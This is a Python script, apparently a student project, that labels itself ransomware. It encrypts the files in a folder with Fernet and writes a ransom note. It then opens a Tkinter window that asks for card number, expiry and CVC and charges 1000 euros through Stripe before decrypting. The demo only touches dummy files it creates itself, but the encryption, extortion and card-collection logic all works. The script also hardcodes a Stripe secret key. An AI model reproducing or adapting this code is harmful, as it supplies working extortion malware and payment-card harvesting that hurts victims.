# Style de la console
from art import *
from termcolor import colored
print(colored (text2art("Paye-ta-race").center(60),'green'))
print(colored("ransomeware created by our network, Need4School".center(50),'cyan'))

# Création des fichiers de l'utilisateur que nous
import os
def create_dir(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)
    return directory

def write_file(path,data):
    file = open(path,'w')
    file.write(data)
    return file
def remplir_repertoire(dir):
    with open(str(dir)+'/'+'file1.txt','w') as file :
        file.write("Ce contenu est très important...")
        file.write("les informations de nos chers clients...")
    with open(str(dir)+'/'+'file2.txt','w') as file :
        file.write("Ce contenu est très important...")
        file.write("les informations de nos chers clients...")
pwd=create_dir('files')
remplir_repertoire(pwd)

# Chiffrement des fichiers de l'utilisateur
from cryptography.fernet import Fernet
items=os.listdir(pwd)
def generation_clef():
    clef=Fernet.generate_key()
    with open ("clef.key",'wb') as key_file:
        key_file.write(clef)
def lire_clef():
    return open('clef.key','rb').read()
def chiffrement(items,clef):
    f=Fernet(clef)
    for item in items :
        with open(item,'rb') as File:
            file_data=File.read()
        encrypted_data=f.encrypt(file_data)
        with open(item,'wb') as File:
            File.write(encrypted_data)
path=[str(pwd) + '/' + item for item in items]
generation_clef()
clef=lire_clef()
chiffrement(path,clef)
with open(str(pwd) + '/' + 'readme.txt','w') as file :
    file.write('PAYEEE !!! Donne mon argent !!!')

# Affichage de l'app en .exe
import tkinter as tk
import tkinter.font as tkFont

class App:
    def __init__(self, root):
        #Titre
        root.title("undefined")
        #Taille de la fenêtre de l'application
        width=600
        height=500
        screenwidth = root.winfo_screenwidth()
        screenheight = root.winfo_screenheight()
        alignstr = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
        root.geometry(alignstr)
        root.resizable(width=False, height=False)

        # # Signale sonore
        # import time
        # import winsound
        # # Set frequency to 2000 Hertz
        # frequency = 600
        # # Set duration to 1500 milliseconds (1.5 seconds)
        # duration = 300

        # var1=True

        # while var1:
        #     # Make beep sound on Windows
        #     winsound.Beep(frequency, duration)
        #     time.sleep(2)

        # Système de paiement
        import stripe

        stripe.api_key = 'sk_test_51MP4JIDouJcaqTebvs7JBZQetAWVyGdP1vJUQZSbQpAhXFnnYMLDgnNWobC82UW6eluRtVpoWUek1pqfjShSSgQo00xtqqT251'

        # Création des éléments d'interface utilisateur Tkinter
        tk.Label(root, text="Numéro de carte").grid(row=0, column=0)
        card_number = tk.Entry(root)
        card_number.grid(row=0, column=1)

        tk.Label(root, text="Date d'expiration (MM/AA)").grid(row=1, column=0)
        expiration_date = tk.Entry(root)
        expiration_date.grid(row=1, column=1)

        tk.Label(root, text="Code de sécurité").grid(row=2, column=0)
        cvc = tk.Entry(root)
        cvc.grid(row=2, column=1)

        def process_payment():
            # Récupération des informations de paiement saisies par l'utilisateur
            card_num = card_number.get()
            exp_date = expiration_date.get()
            cvc_code = cvc.get()

            # Création d'un token de test à partir des informations de paiement
            token = stripe.Token.create(
                card={
                    "number": card_num,
                    "exp_month": exp_date.split('/')[0],
                    "exp_year": exp_date.split('/')[1],
                    "cvc": cvc_code
                }
            )

            # Utilisation du token de test pour créer une charge
            charge = stripe.Charge.create(
                amount=100000,
                currency='eur',
                source=token['id'],
                description='Paiement en ligne'
            )

            # Affichage de la réponse de Stripe dans la console
            print(charge["status"])
            if charge["status"] == "succeeded":
                def decrypt(items, clef):
                    f=Fernet(clef)
                    for item in items:
                        with open(item,'rb') as File:
                            file_data=File.read()
                        decrypted_data=f.decrypt(file_data)
                        with open(item,'wb') as File:
                            File.write(decrypted_data)
                def lire_clef():
                    return open('clef.key','rb').read()
                clef=lire_clef()
                path="C:/xampp/htdocs/test_py/files"
                os.remove(path + '/' + 'readme.txt')
                items=os.listdir(path)
                chemin=[path + '/' + item for item in items]
                decrypt(chemin,clef)

        # Création du bouton de paiement
        tk.Button(root, text="Payer", command=process_payment).grid(row=3, column=0, columnspan=2)

    def GButton_220_command(self):
        print("command")

if __name__ == "__main__":
    root = tk.Tk()
    app = App(root)
    root.mainloop()
    